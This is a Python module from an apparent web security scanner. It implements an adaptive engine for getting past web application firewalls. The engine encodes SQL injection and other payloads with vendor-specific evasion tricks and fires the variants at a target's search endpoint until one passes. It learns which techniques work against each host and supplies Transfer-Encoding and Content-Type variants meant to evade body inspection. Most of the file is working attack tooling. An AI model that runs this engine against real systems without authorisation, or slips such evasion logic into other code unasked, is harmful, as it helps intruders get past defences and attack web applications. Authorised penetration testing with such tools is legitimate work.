"""WAF adaptive bypass engine — centralized bypass strategies per WAF vendor.

Replaces ad-hoc bypass logic scattered across plugins with a single engine
that adapts encoding/evasion based on detected WAF fingerprint.

Usage::

    engine = WafBypassEngine()
    engine.set_waf("Cloudflare")

    # Get bypass-encoded payload
    variants = engine.encode("' OR 1=1--", "sqli")

    # Test and learn
    result = engine.test_bypass(ctx, base_url, "' OR 1=1--")
    if result.passed:
        print(f"Bypass found: {result.technique}")
"""

from __future__ import annotations

import logging
from typing import Any
from urllib.parse import quote

from basilisk.utils.waf_encodings import (
    ENCODING_FUNCTIONS,
    BypassResult,
    _case_swap,
    _chunked_randomized,
    _chunked_transfer,
    _comment_split,
    _concat_function,
    _double_encode,
    _double_slash,
    _header_case_variation,
    _hex_entity_encode,
    _hpp,
    _html_entity_encode,
    _js_unicode_encode,
    _json_comment_injection,
    _json_duplicate_keys,
    _json_scientific_numbers,
    _json_unicode_escape,
    _json_unicode_keys,
    _matrix_params,
    _multiline,
    _multipart_form,
    _null_byte,
    _overlong_utf8,
    _path_normalization,
    _trailing_dot,
    _unicode_normalize,
    _whitespace_variant,
)
from basilisk.utils.waf_profiles import WAF_PROFILES, WafProfile

logger = logging.getLogger(__name__)

# Re-exports for backward compatibility
__all__ = [
    "WafBypassEngine",
    "WafProfile",
    "WAF_PROFILES",
    "BypassResult",
    "ENCODING_FUNCTIONS",
    "_double_encode",
    "_case_swap",
    "_comment_split",
    "_whitespace_variant",
    "_null_byte",
    "_unicode_normalize",
    "_multiline",
    "_concat_function",
    "_hpp",
    "_chunked_transfer",
    "_multipart_form",
    "_html_entity_encode",
    "_hex_entity_encode",
    "_js_unicode_encode",
    "_overlong_utf8",
    "_json_unicode_escape",
    "_chunked_randomized",
    "_matrix_params",
    "_path_normalization",
    "_double_slash",
    "_trailing_dot",
    "_json_unicode_keys",
    "_json_scientific_numbers",
    "_json_duplicate_keys",
    "_json_comment_injection",
    "_header_case_variation",
]


class WafBypassEngine:
    """Adaptive WAF bypass engine.

    Selects encoding strategies based on detected WAF type.
    Tracks which techniques work and learns during a scan session.
    """

    def __init__(self) -> None:
        self._waf_name: str = ""
        self._profile: WafProfile | None = None
        self._working_techniques: dict[str, list[str]] = {}  # host -> [techniques]
        self._failed_techniques: dict[str, list[str]] = {}   # host -> [techniques]

    @property
    def waf_detected(self) -> bool:
        return bool(self._waf_name)

    @property
    def waf_name(self) -> str:
        return self._waf_name

    @property
    def profile(self) -> WafProfile | None:
        return self._profile

    def set_waf(self, waf_name: str | dict) -> None:
        """Set the detected WAF type for this session."""
        # Defensive: extract name from dict if waf_detect returned dict entries
        if isinstance(waf_name, dict):
            waf_name = str(waf_name.get("name", "Unknown WAF"))
        else:
            waf_name = str(waf_name)
        self._waf_name = waf_name
        self._profile = WAF_PROFILES.get(waf_name, WAF_PROFILES.get("Unknown WAF"))
        logger.info("WAF bypass engine configured for: %s", waf_name)

    def set_waf_from_pipeline(self, host: str, pipeline: dict) -> None:
        """Auto-detect WAF from pipeline results."""
        waf_key = f"waf_detect:{host}"
        waf_result = pipeline.get(waf_key)
        if waf_result and waf_result.ok:
            waf_list = waf_result.data.get("waf", [])
            if waf_list:
                waf_entry = waf_list[0]
                # waf_detect returns list[dict] with "name" key, not list[str]
                if isinstance(waf_entry, dict):
                    waf_name = str(waf_entry.get("name", "Unknown WAF"))
                else:
                    waf_name = str(waf_entry)
                self.set_waf(waf_name)

    def encode(self, payload: str, category: str = "sqli") -> list[str]:
        """Generate bypass-encoded variants of a payload.

        Returns list of encoded variants, ordered by likelihood of success.
        If no WAF detected, returns [payload] unchanged.
        """
        if not self._profile:
            return [payload]

        variants: list[str] = [payload]
        seen: set[str] = {payload}

        for technique_name in self._profile.effective_encodings:
            fn = ENCODING_FUNCTIONS.get(technique_name)
            if fn is None:
                continue
            try:
                encoded = fn(payload)
                if encoded and encoded not in seen:
                    seen.add(encoded)
                    variants.append(encoded)
            except Exception:
                continue

        return variants

    def encode_with_headers(self, payload: str) -> list[tuple[str, dict[str, str]]]:
        """Generate variants with both encoding and header-based bypasses.

        Returns list of (encoded_payload, extra_headers).
        """
        result: list[tuple[str, dict[str, str]]] = []

        # Standard encoded variants without extra headers
        for variant in self.encode(payload):
            result.append((variant, {}))

        # Add header-based bypasses
        if self._profile and self._profile.bypass_headers:
            result.append((payload, dict(self._profile.bypass_headers)))
            # Combine with top encoding
            if len(self.encode(payload)) > 1:
                result.append((
                    self.encode(payload)[1],
                    dict(self._profile.bypass_headers),
                ))

        # Add content-type bypasses
        if self._profile and self._profile.safe_content_types:
            for ct in self._profile.safe_content_types:
                result.append((payload, {"Content-Type": ct}))

        return result

    def record_success(self, host: str, technique: str) -> None:
        """Record a working bypass technique for learning."""
        if host not in self._working_techniques:
            self._working_techniques[host] = []
        if technique not in self._working_techniques[host]:
            self._working_techniques[host].append(technique)
            logger.info("WAF bypass success: %s on %s", technique, host)

    def record_failure(self, host: str, technique: str) -> None:
        """Record a failed bypass technique."""
        if host not in self._failed_techniques:
            self._failed_techniques[host] = []
        if technique not in self._failed_techniques[host]:
            self._failed_techniques[host].append(technique)

    def get_working_techniques(self, host: str) -> list[str]:
        """Get techniques that worked for a specific host."""
        return list(self._working_techniques.get(host, []))

    def get_best_encoding(self, host: str, payload: str) -> str:
        """Get best encoding for a host based on learned data."""
        working = self._working_techniques.get(host, [])
        if working:
            # Use first known working technique
            fn = ENCODING_FUNCTIONS.get(working[0])
            if fn:
                try:
                    return fn(payload)
                except Exception:
                    pass

        # Fallback to first profile encoding
        if self._profile and self._profile.effective_encodings:
            fn = ENCODING_FUNCTIONS.get(self._profile.effective_encodings[0])
            if fn:
                try:
                    return fn(payload)
                except Exception:
                    pass

        return payload

    async def test_bypass(
        self,
        ctx: Any,
        base_url: str,
        payload: str,
        *,
        host: str = "",
        param: str = "q",
    ) -> BypassResult:
        """Test bypass techniques iteratively against a target.

        Sends payload with each encoding technique until one passes through.
        Records results for future use.

        Args:
            ctx: PluginContext with http and rate
            base_url: Base URL of target
            payload: Raw payload to test
            host: Target host for recording results
            param: Query parameter to inject into
        """
        best = BypassResult(original=payload, encoded=payload, technique="none")

        # First test raw payload to establish baseline (should be blocked)
        try:
            async with ctx.rate:
                resp = await ctx.http.get(
                    f"{base_url}/search?{param}={quote(payload)}", timeout=8.0,
                )
                if resp.status < 400:
                    # Not blocked — no WAF or WAF allows this
                    best.passed = True
                    best.status = resp.status
                    best.technique = "raw"
                    return best
                best.status = resp.status
        except Exception:
            return best

        # Try each encoding technique
        variants = self.encode_with_headers(payload)
        for encoded, headers in variants:
            if encoded == payload and not headers:
                continue  # Skip raw which we already tested

            try:
                url = f"{base_url}/search?{param}={quote(encoded, safe='')}"
                async with ctx.rate:
                    resp = await ctx.http.get(
                        url, headers=headers or None, timeout=8.0,
                    )
                    if resp.status < 400:
                        technique = "unknown"
                        # Find which technique produced this encoding
                        for name, fn in ENCODING_FUNCTIONS.items():
                            try:
                                if fn(payload) == encoded:
                                    technique = name
                                    break
                            except Exception:
                                continue

                        best = BypassResult(
                            original=payload,
                            encoded=encoded,
                            technique=technique,
                            passed=True,
                            status=resp.status,
                            waf_name=self._waf_name,
                        )
                        if host:
                            self.record_success(host, technique)
                        return best
                    elif host:
                        # Record failure for learning
                        for name, fn in ENCODING_FUNCTIONS.items():
                            try:
                                if fn(payload) == encoded:
                                    self.record_failure(host, name)
                                    break
                            except Exception:
                                continue
            except Exception:
                continue

        return best

    def encode_for_context(
        self,
        payload: str,
        context: str = "query",
    ) -> list[str]:
        """Context-aware encoding — select techniques appropriate for injection point.

        Args:
            payload: Raw payload to encode.
            context: One of "query", "json_body", "xml_body", "header", "path".
        """
        context_techniques: dict[str, list[str]] = {
            "query": [
                "double_encode", "case_swap", "comment_split",
                "unicode_normalize", "null_byte", "hpp",
            ],
            "json_body": [
                "json_unicode_keys", "json_unicode_escape",
                "json_scientific_numbers", "json_duplicate_keys",
                "json_comment_injection",
            ],
            "xml_body": [
                "html_entity_encode", "hex_entity_encode",
                "unicode_normalize",
            ],
            "header": [
                "header_case_variation", "unicode_normalize",
                "double_encode",
            ],
            "path": [
                "double_slash", "matrix_params", "path_normalization",
                "trailing_dot", "overlong_utf8", "double_encode",
            ],
        }

        techniques = context_techniques.get(context, list(ENCODING_FUNCTIONS.keys()))

        # If WAF profile is set, also include profile-effective techniques
        if self._profile:
            effective = set(self._profile.effective_encodings)
            ctx_set = set(context_techniques.get(context, []))
            techniques = [t for t in techniques if t in effective or t in ctx_set]

        variants: list[str] = [payload]
        seen: set[str] = {payload}
        for technique in techniques:
            fn = ENCODING_FUNCTIONS.get(technique)
            if fn is None:
                continue
            try:
                encoded = fn(payload)
                if encoded and encoded not in seen:
                    seen.add(encoded)
                    variants.append(encoded)
            except Exception:
                continue
        return variants

    def get_te_bypass_headers(self) -> list[dict[str, str]]:
        """Transfer-Encoding header variations for protocol-level WAF bypass."""
        return [
            {"Transfer-Encoding": "chunked"},
            {"Transfer-Encoding": " chunked"},
            {"Transfer-Encoding": "chunked\t"},
            {"Transfer-Encoding": "identity, chunked"},
            {"Transfer-Encoding": "chunked, identity"},
            {"Transfer-encoding": "chunked"},
            {"Transfer-Encoding": "CHUNKED"},
            {"Transfer-Encoding": "\tchunked"},
            {"Transfer-Encoding": "chunked;ext=value"},
        ]

    def get_content_type_bypasses(self, original_ct: str) -> list[str]:
        """Content-Type variations to avoid WAF body inspection."""
        if "json" in original_ct:
            return [
                "application/json",
                "application/json; charset=utf-8",
                "application/csp-report",
                "application/x-json",
                "text/json",
                "text/x-json",
                "application/vnd.api+json",
            ]
        if "form" in original_ct:
            return [
                "application/x-www-form-urlencoded",
                "application/x-www-form-urlencoded; charset=utf-8",
                "multipart/form-data; boundary=----basilisk",
            ]
        return [original_ct]
